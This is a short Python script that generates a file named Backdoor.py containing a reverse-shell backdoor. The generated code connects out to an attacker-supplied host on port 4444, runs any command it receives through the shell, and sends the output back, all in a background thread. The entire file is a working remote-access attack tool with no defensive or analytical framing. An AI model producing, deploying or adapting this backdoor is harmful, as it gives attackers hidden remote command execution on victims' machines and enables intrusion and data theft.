import socket
import subprocess

def RS(LHOST):
    with open("Backdoor.py","w") as f:
        f.write("""
import threading
import socket
import subprocess\n""")
        f.write("""
def main():\n""")
        f.write(f"    server_ip ={LHOST}")
        f.write("""
    port = 4444

    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)

mal_thread = threading.Thread(target=main)
mal_thread.start()

""")
        f.close()
